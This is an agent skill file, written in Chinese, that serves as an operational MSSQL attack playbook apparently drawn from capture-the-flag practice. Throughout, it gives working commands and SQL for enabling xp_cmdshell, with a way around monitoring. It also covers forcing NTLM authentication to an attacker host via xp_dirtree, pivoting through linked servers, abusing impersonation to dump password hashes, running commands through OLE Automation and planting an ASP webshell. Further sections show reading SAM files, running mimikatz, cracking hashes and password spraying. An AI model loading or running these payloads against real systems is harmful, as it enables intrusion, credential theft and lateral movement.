---
name: 'mssql-attack-chain'
description: 'MSSQL 攻击全链：xp_cmdshell/UNC injection/linked servers/impersonation/OLE automation + 🆕Werkzeug PBKDF2 hash破解/Eighteen IMPERSONATE模式'
disable-model-invocation: true
metadata: { domain: db, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# MSSQL 完整攻击链参考

## 1. Initial Enumeration（初始侦查）

### NetExec (nxc)
```bash
# 基础扫描 - 发现 MSSQL 实例
nxc mssql <target> -u <user> -p <pass> [-d <domain>]
nxc mssql <target> -u <user> -p <pass> --local-auth
nxc mssql <target> -u '' -p ''   # 空凭证测试
nxc mssql <target> -u <user> -p <pass> -M mssql_priv  # 检查权限

# 执行 SQL 查询
nxc mssql <target> -u <user> -p <pass> -q "SELECT @@version"
nxc mssql <target> -u <user> -p <pass> -q "SELECT system_user"
nxc mssql <target> -u <user> -p <pass> -q "SELECT is_srvrolemember('sysadmin')"

# 批量扫描
nxc mssql 192.168.1.0/24 -u <user> -p <pass>
```

### Impacket mssqlclient.py
```bash
# Windows 认证（域/本地）
mssqlclient.py -windows-auth <domain>/<user>:<pass>@<target>
mssqlclient.py -windows-auth <domain>/<user>@<target> -hashes :<nt_hash>

# SQL 认证
mssqlclient.py <user>:<pass>@<target>
mssqlclient.py <user>@<target> -hashes :<nt_hash>

# 交互式 shell 后
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### 手工 SQL 侦查命令
```sql
-- 版本与主机信息
SELECT @@version;
SELECT @@servername;
SELECT @@servicename;
SELECT DB_NAME();
SELECT HOST_NAME();
SELECT SYSTEM_USER;

-- 当前用户权限
SELECT is_srvrolemember('sysadmin');      -- 是否 sysadmin (1=是)
SELECT is_srvrolemember('securityadmin');
SELECT is_srvrolemember('serveradmin');
SELECT is_srvrolemember('setupadmin');
SELECT is_srvrolemember('processadmin');
SELECT is_srvrolemember('diskadmin');
SELECT is_srvrolemember('dbcreator');
SELECT is_srvrolemember('bulkadmin');
SELECT is_srvrolemember('public');         -- 永远为 1

-- 数据库角色（当前 DB 内）
SELECT IS_MEMBER('db_owner');
SELECT IS_MEMBER('db_datareader');

-- 枚举所有链接服务器
SELECT name, data_source, provider, provider_string 
FROM sys.servers 
WHERE is_linked = 1;

-- 也可以用
EXEC sp_linkedservers;

-- 枚举可模拟登录
SELECT DISTINCT name FROM sys.server_principals 
WHERE type IN ('S','U','G') 
AND name NOT LIKE '##%' 
AND name <> 'sa';

-- 检查当前安全上下文
SELECT * FROM sys.login_token;
SELECT * FROM sys.user_token;

-- 检查 xp_cmdshell 状态
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';

-- OLE Automation 状态
EXEC sp_configure 'Ole Automation Procedures';

-- 检查哪些用户有模拟权限
SELECT * FROM sys.server_permissions 
WHERE permission_name = 'IMPERSONATE';
```

---

## 2. xp_cmdshell（命令执行）

### 启用 xp_cmdshell（需要 sysadmin）
```sql
-- 方法1：sp_configure（标准方式）
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 方法2：手动改配置值（绕过某些监控，直接改 sys.configurations）
UPDATE sys.configurations SET value = 1 WHERE name = 'xp_cmdshell';
RECONFIGURE;

-- 验证
EXEC xp_cmdshell 'whoami';
```

### mssqlclient.py 快捷方式
```
SQL> enable_xp_cmdshell          # 自动启用
SQL> xp_cmdshell whoami          # 执行命令
SQL> xp_cmdshell powershell -enc <base64>
```

### 常见问题

| 问题 | 原因 | 解决 |
|------|------|------|
| `Could not find stored procedure 'xp_cmdshell'` | xp_cmdshell 存储过程不存在或被删除 | 用 sp_addextendedproc 重建（见下方） |
| `SQL Server blocked access to procedure 'sys.xp_cmdshell'` | 安全策略/防病毒拦截 | 尝试 OLE Automation 替代 |
| `The EXECUTE permission was denied` | 当前用户无执行权限 | 需要 sysadmin 授权 |
| 命令执行无回显 | 输出只有 `NULL` | 用 `INSERT INTO` 临时表捕获输出 |

### 重建 xp_cmdshell（如已被删除，需要 sysadmin）
```sql
EXEC sp_addextendedproc 'xp_cmdshell', 'xplog70.dll';
-- 如果 xplog70.dll 也不存在，可尝试 xpstar.dll
EXEC sp_addextendedproc 'xp_cmdshell', 'xpstar.dll';
```

### xp_cmdshell 输出捕获
```sql
-- 创建临时表接收输出
CREATE TABLE #output (result NVARCHAR(4000));
INSERT INTO #output EXEC xp_cmdshell 'whoami';
SELECT * FROM #output WHERE result IS NOT NULL;
DROP TABLE #output;
```

---

## 3. UNC Path Injection（UNC 路径注入）

### 原理
强制 MSSQL 通过 UNC 路径访问攻击者控制的 SMB 服务器，捕获 NetNTLMv2 哈希或中继认证。

### 攻击端准备
```bash
# Responder 捕获哈希
sudo responder -I tun0 -v

# ntlmrelayx 中继到其他主机
sudo impacket-ntlmrelayx -t smb://<target-ip> -smb2support -of hash.txt

# 或中继到 LDAP
sudo impacket-ntlmrelayx -t ldap://<dc-ip> --escalate-user <user> --delegate-access
```

### SQL 触发命令
```sql
-- xp_dirtree（最常用，需要 PUBLIC 即可）
EXEC master.dbo.xp_dirtree '\\<attacker-ip>\share';

-- xp_subdirs（列子目录，同样 PUBLIC 可执行）
EXEC master.dbo.xp_subdirs '\\<attacker-ip>\share';

-- xp_fileexist（检查文件是否存在）
EXEC master.dbo.xp_fileexist '\\<attacker-ip>\share\test.txt';

-- 获取文件列表
EXEC master.dbo.xp_getfiledetails '\\<attacker-ip>\share\file.txt';

-- 通过 OPENROWSET（需要 ad-hoc distributed queries 开启）
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=<attacker-ip>;UID=test;PWD=test;', 'SELECT 1');
```

### 权限要求
- `xp_dirtree` / `xp_subdirs` / `xp_fileexist`：**PUBLIC 角色即可执行**
- `xp_getfiledetails`：通常需要更高权限
- 这些是 UNC 注入的最佳选择，不需要 sysadmin

### 常见坑
- Windows Defender / EDR 可能拦截出站 SMB
- 如果出站 445 被防火墙阻止，尝试 139（NetBIOS）
- MSSQL 服务账户必须是 NetworkService 或域账户才能发起认证；`LOCAL SERVICE` 和 `LOCAL SYSTEM` 可能使用机器账户
- responder 必须和 MSSQL 在同一网段或路由可达

---

## 4. Linked Servers（链接服务器）

### 枚举链接服务器
```sql
-- 列出所有链接服务器
SELECT name, data_source, provider, provider_string, is_linked 
FROM sys.servers 
WHERE is_linked = 1;

-- 也可用
EXEC sp_linkedservers;

-- 查看链接服务器详细信息
SELECT * FROM sys.servers;

-- 查看当前服务器上定义的远程登录映射
EXEC sp_helplinkedsrvlogin;
```

### 查询链接服务器
```sql
-- 直接查询
SELECT * FROM [LINKED_SERVER].[database].[schema].[table];

-- 通过 OPENQUERY（更灵活）
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version');
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER');

-- 枚举链接服务器上的数据库
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT name FROM sys.databases');

-- 检查链接服务器上的权限
SELECT * FROM OPENQUERY([LINKED_SERVER], 
  'SELECT is_srvrolemember(''sysadmin'')');
```

### 在链接服务器上执行命令
```sql
-- 如果链接服务器上 xp_cmdshell 已启用
SELECT * FROM OPENQUERY([LINKED_SERVER], 
  'EXEC xp_cmdshell ''whoami''');

-- 嵌套：通过链接服务器 A 访问链接服务器 B
-- 先启用 A 上的 "RPC Out" 选项
EXEC sp_serveroption 'LINKED_SERVER_A', 'rpc out', 'true';
EXEC sp_serveroption 'LINKED_SERVER_A', 'rpc', 'true';

-- 然后在 A 上通过 EXECUTE 远程执行
EXEC ('EXEC (''SELECT @@version'') AT [LINKED_SERVER_B]') AT [LINKED_SERVER_A];
```

### 利用链接服务器提升权限
```sql
-- 场景：本地是普通用户，链接服务器的映射登录是 sysadmin
-- 查看链接服务器使用的安全上下文
SELECT name, is_remote_login_enabled, remote_name 
FROM sys.linked_logins;

-- 如果使用 "Be made using the login's current security context"
-- 且你的登录在两个服务器上都存在且拥有更高权限
SELECT * FROM OPENQUERY([LINKED_SERVER], 
  'SELECT is_srvrolemember(''sysadmin'')');

-- 如果远程是 sysadmin，直接用 OPENQUERY 执行操作
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') 
  AT [LINKED_SERVER];
EXEC ('EXEC xp_cmdshell ''powershell -enc ...''') 
  AT [LINKED_SERVER];
```

### 创建链接服务器（需要 ALTER ANY SERVER 或 sysadmin）
```sql
-- 创建一个回连到你控制的服务器的链接
EXEC sp_addlinkedserver 
  @server='ATTACKER', 
  @srvproduct='', 
  @provider='SQLNCLI', 
  @datasrc='<your-ip>';
EXEC sp_addlinkedsrvlogin 
  @rmtsrvname='ATTACKER', 
  @useself='false', 
  @locallogin=NULL, 
  @rmtuser='sa', 
  @rmtpassword='P@ssw0rd';
```

---

## 5. Impersonation（模拟/身份切换）

### 枚举可模拟的登录
```sql
-- 方法1：查看当前用户的 IMPERSONATE 权限（最准确）
SELECT DISTINCT b.name 
FROM sys.server_permissions a 
INNER JOIN sys.server_principals b 
  ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE' 
  AND a.grantee_principal_id = USER_ID();

-- 方法2：查看所有 IMPERSONATE 授权关系
SELECT 
  grantee.name AS grantee_name,
  grantor.name AS grantor_name,
  sp.permission_name
FROM sys.server_permissions sp
JOIN sys.server_principals grantee ON sp.grantee_principal_id = grantee.principal_id
JOIN sys.server_principals grantor ON sp.grantor_principal_id = grantor.principal_id
WHERE sp.permission_name = 'IMPERSONATE';

-- 方法3：查看当前安全上下文
SELECT * FROM sys.login_token;
SELECT * FROM sys.user_token;
```

### 执行模拟
```sql
-- 切换安全上下文到目标登录
EXECUTE AS LOGIN = 'finance_app';
SELECT SYSTEM_USER;          -- 验证当前身份 → finance_app
SELECT DB_NAME();            -- 验证当前数据库

-- 🆕 典型场景 (Eighteen)：模拟 app 用户后切换到它的数据库
USE FinancePlanner;
SELECT username, password_hash FROM admins;

-- 回退到原始身份
REVERT;

-- 模拟数据库用户
USE [target_db];
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();
REVERT;
```

### 🆕 Impersonation 获取密码哈希（Eighteen 模式）

```sql
-- 步骤1：枚举可模拟登录
SELECT b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- 步骤2：模拟目标
EXECUTE AS LOGIN = 'finance_app';

-- 步骤3：切换到应用数据库
USE FinancePlanner;

-- 步骤4：读取密码哈希
SELECT username, password_hash FROM admins;
-- → admin : pbkdf2:sha256:600000$<salt>$<hash>

-- 步骤5：识别哈希格式
-- pbkdf2:sha256:N$salt$hash → Werkzeug (Flask) → hashcat -m 10900
```

### Werkzeug PBKDF2-SHA256 哈希识别与破解
```bash
# 格式特征
pbkdf2:sha256:<iterations>$<salt>$<hash>

# 如：
# pbkdf2:sha256:600000$abc123$def456...
# → hashcat mode 10900

# 破解
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt

# 哈希文件格式：把完整字符串原文放入，不含换行
echo 'pbkdf2:sha256:600000$salt$hash' > hash.txt

# 🆕 破解后的密码 → 立即去交互化 + 密码喷洒 WinRM
nxc winrm dc01.htb -u users.txt -p '<cracked_pw>' --continue-on-success
```

### 模拟数据库用户
```sql
-- 在特定数据库内切换用户
USE [target_db];
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();
REVERT;
```

### 利用 Trustworthy 数据库
```sql
-- 查找标记为 TRUSTWORTHY 的数据库
SELECT name, is_trustworthy_on FROM sys.databases 
WHERE is_trustworthy_on = 1 AND name != 'msdb';

-- 如果数据库是 trustworthy 且你是 db_owner
-- 可以提升到 sysadmin（通过 CLR 或存储过程）
USE [trustworthy_db];
EXECUTE AS USER = 'dbo';
CREATE PROCEDURE sp_elevate 
WITH EXECUTE AS OWNER 
AS 
EXEC sp_configure 'xp_cmdshell', 1; 
RECONFIGURE;
GO
EXEC sp_elevate;
```

### 注意
- `EXECUTE AS LOGIN` 要求有对应登录的 `IMPERSONATE` 权限
- 只有 `sysadmin` 可以随意模拟任何登录
- 模拟完成后记得 `REVERT`，否则后续操作仍以模拟身份运行

---

## 6. OLE Automation（OLE 自动化命令执行）

### 启用 OLE Automation（需要 sysadmin）
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

### 通过 OLE 执行命令
```sql
-- 创建 WScript.Shell 对象
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\windows\temp\out.txt', 0, 1;
EXEC sp_OADestroy @shell;

-- 读取输出文件
-- (需要 BULK INSERT 或 OPENROWSET 权限)

-- 使用 Shell.Application 执行
DECLARE @shell INT;
EXEC sp_OACreate 'Shell.Application', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'ShellExecute', NULL, 'cmd.exe', '/c whoami', 'C:\windows\temp', 'open', '0';
EXEC sp_OADestroy @shell;

-- 使用 ScriptControl (VBScript)
DECLARE @sc INT, @result INT;
EXEC sp_OACreate 'ScriptControl', @sc OUTPUT;
EXEC sp_OASetProperty @sc, 'Language', 'VBScript';
EXEC sp_OAMethod @sc, 'ExecuteStatement', NULL, 
  'CreateObject("WScript.Shell").Run "cmd /c whoami > C:\windows\temp\out2.txt", 0, True';
EXEC sp_OADestroy @sc;
```

### 优势
- 不依赖 xp_cmdshell
- 某些 EDR 可能不监控 OLE Automation 调用
- 可以使用 VBScript/JScript 执行复杂逻辑

### 限制
- 需要 sysadmin 开启 OLE Automation Procedures
- 输出捕获同样困难，需要写文件再读取
- 某些杀软会拦截 `WScript.Shell` 的创建

---

## 7. File Read/Write（文件读写）

### 读取文件 - OPENROWSET BULK
```sql
-- 需要 BULK INSERT 或 ADMINISTER BULK OPERATIONS 权限
-- 和 bulkadmin 或 sysadmin 角色
SELECT * FROM OPENROWSET(
  BULK 'C:\inetpub\wwwroot\web.config', 
  SINGLE_BLOB
) AS data;

-- 读取 NTLM 相关文件
SELECT * FROM OPENROWSET(
  BULK 'C:\Windows\System32\drivers\etc\hosts', 
  SINGLE_CLOB
) AS data;

-- 读取 SAM/SYSTEM 注册表文件
SELECT * FROM OPENROWSET(
  BULK 'C:\Windows\repair\SAM', 
  SINGLE_BLOB
) AS data;
```

### 读取文件 - fn_xe_file_target_read_file (SQL Server 2012+)
```sql
-- 需要 VIEW SERVER STATE 权限
SELECT * FROM fn_xe_file_target_read_file(
  'C:\path\to\file.txt', NULL, NULL, NULL
);
```

### 读取文件 - sp_execute_external_script (SQL Server 2016+, 需要启用)
```sql
EXEC sp_execute_external_script 
  @language = N'Python',
  @script = N'
import os
print(os.popen("type C:\temp\file.txt").read())
';
```

### 写文件 - OLE Automation
```sql
-- 通过 FileSystemObject 写文件
DECLARE @fso INT, @file INT, @text VARCHAR(8000);
SET @text = '<%25= Shell("cmd /c whoami") %25>'; -- ASP webshell

EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUTPUT, 
  'C:\inetpub\wwwroot\shell.asp', 2, 1;
EXEC sp_OAMethod @file, 'Write', NULL, @text;
EXEC sp_OAMethod @file, 'Close';
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @fso;
```

### 写文件 - xp_cmdshell + echo
```sql
-- PowerShell 写文件（更适合二进制）
EXEC xp_cmdshell 'powershell -c "Set-Content -Path C:\temp\payload.exe -Value ([Convert]::FromBase64String(''BASE64_BLOB'')) -Encoding Byte"';
```

### 写文件 - OPENROWSET BULK（需要目标表）
```sql
-- 将文件内容首先导入表，再用 bcp 导出（间接方式）
-- 不推荐直接用于攻击
```

---

## 8. Common Pitfalls（常见坑与解决方案）

### 认证问题
| 症状 | 原因 | 解决 |
|------|------|------|
| `Login failed for user 'sa'` | 密码错误或 sa 被禁用 | 检查 sa 是否 `is_disabled=1` |
| `Cannot generate SSPI context` | Kerberos 时间不同步/SPN 问题 | 同步时间；用 IP 代替主机名 |
| `The target principal name is incorrect` | SPN 未注册或错误 | `setspn -Q MSSQLSvc/*` |
| SQL 认证失败但 Windows 认证成功 | sa 被禁用或密码过期 | 用 Windows 认证然后启用 sa |
| `Login failed. The login is from an untrusted domain` | 跨域信任问题 | 使用 SQL 认证或检查域信任 |

### 网络问题
```bash
# 测试端口连通性
nmap -p 1433 <target>
nmap -p 1434 <target>   # UDP - SQL Server Browser

# MSSQL 可能在其他端口
nmap -p 1433,1434,14330-14350 <target>
nmap -sV --script ms-sql-info <target>

# 出站 SMB 是否可达（UNC 注入前检查）
nmap -p 445 <attacker-ip>   # 从目标角度检查
```

### 权限阶梯
```
PUBLIC 
  -> 枚举链接服务器
  -> UNC 注入 (xp_dirtree)
  -> 读取某些文件和注册表

db_owner 
  -> Trustworthy DB 提权
  -> 创建存储过程
  
sysadmin 
  -> 启用 xp_cmdshell
  -> 启用 OLE Automation
  -> 执行任何系统命令
  -> 模拟任何登录
```

### xp_cmdshell 不工作的排查
```sql
-- 1. 检查是否存在
SELECT OBJECT_ID('xp_cmdshell');
-- 返回 NULL 表示不存在

-- 2. 检查是否启用
EXEC sp_configure 'xp_cmdshell';
-- config_value = 0 表示禁用

-- 3. 检查执行权限
SELECT * FROM syspermissions 
WHERE grantee = USER_ID() 
AND object_name(id) = 'xp_cmdshell';

-- 4. 检查 SQL Server 服务账户
EXEC xp_cmdshell 'whoami';
-- NT AUTHORITY\NETWORK SERVICE 可能有网络限制
-- NT AUTHORITY\SYSTEM 有高权限但无网络认证能力（UNC 注入可能使用计算机账户）
```

### xp_cmdshell 权限被拒时的替代链
```
xp_cmdshell 不可用:
  -> OLE Automation (sp_OACreate)
  -> CLR 程序集（需要 CREATE ASSEMBLY 权限）
  -> Agent Jobs（需要 SQLAgentUserRole）
  -> 外部脚本 (sp_execute_external_script, SQL 2016+)
  -> xp_regwrite 修改注册表（若有权限）
```

---

## 9. Password Extraction（密码提取）

### 🆕 Werkzeug PBKDF2-SHA256 哈希 (Flask/SQLAlchemy)
```
格式: pbkdf2:sha256:<iterations>$<salt>$<hash>
特征: 以 "pbkdf2:sha256:" 开头
hashcat: -m 10900
来源: Flask Werkzeug security 模块 generate_password_hash()
典型场景: 应用数据库 admin 表密码字段
后续: 破解后密码喷洒 AD → WinRM/SSH
```

### 从 sys.servers 提取链接服务器凭证
```sql
-- 直查询（密码通常是加密的但可解密）
SELECT name, data_source, provider_string FROM sys.servers;
```

### 从连接字符串中提取
```sql
-- 查找包含密码的连接字符串
SELECT name, data_source, provider_string 
FROM sys.servers 
WHERE provider_string LIKE '%Password%' 
   OR provider_string LIKE '%PWD%';

-- 其他可能存储密码的地方
SELECT name, 
  CAST(CAST(credential_identity AS VARBINARY(MAX)) AS VARCHAR(MAX)) 
FROM sys.credentials;
```

### 使用 PowerUpSQL 提取
```powershell
# 获取实例信息
Get-SQLInstanceLocal
Get-SQLInstanceDomain

# 提取链接服务器密码
Get-SQLServerLinkCrawl -Instance <target>
Get-SQLServerPasswordHash -Instance <target>
```

### 从内存中提取（Mimikatz / SafetyKatz）
```bash
# 在目标服务器上
mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

### SSIS 包密码
```sql
-- 查询 SSISDB 中的连接信息
SELECT * FROM SSISDB.internal.object_parameters 
WHERE parameter_name LIKE '%Password%';
```

### SQL Agent 作业中的密码
```sql
-- 搜索作业步骤中的明文密码
SELECT 
  j.name AS job_name,
  js.step_id,
  js.command
FROM msdb.dbo.sysjobs j
JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id
WHERE js.command LIKE '%PASSWORD%' 
   OR js.command LIKE '%pwd%';
```

---

## Quick Reference: Attack Path Decision Tree

```
获得 SQL 认证凭据
  │
  ├─ 是 sysadmin?
  │   ├─ YES: enable_xp_cmdshell → 命令执行 → 拿下主机
  │   ├─ YES (xp_cmdshell 被阻): OLE Automation → 命令执行
  │   └─ YES (全被阻): 写 webshell / CLR 程序集
  │
  ├─ 不是 sysadmin?
  │   ├─ 检查 IMPERSONATE 权限 → EXECUTE AS LOGIN 模拟高权限用户
  │   │   └─ 🆕 典型收益：应用DB中的哈希(Werkzeug/BCrypt) → crack → 密码喷洒
  │   ├─ 检查链接服务器 → OPENQUERY 横向移动
  │   ├─ UNC 注入 (xp_dirtree) → 捕获 NTLM 哈希 / 中继
  │   ├─ Trustworthy DB + db_owner → 提权
  │   └─ 仅 PUBLIC: 信息收集 + UNC 注入
  │
  └─ 无 SQL 凭据?
      ├─ 扫描 MSSQL 实例 (UDP 1434)
      ├─ 爆破弱密码 (sa, sqladmin, 空密码)
      └─ Kerberos SPN 枚举 → Kerberoasting
```

---

## Useful nxc Modules

```bash
nxc mssql <target> -u <user> -p <pass> -M mssql_priv
nxc mssql <target> -u <user> -p <pass> -M web_delivery
nxc mssql <target> -u <user> -p <pass> -M share_enum
nxc mssql <target> -u <user> -p <pass> --local-auth --shares
```
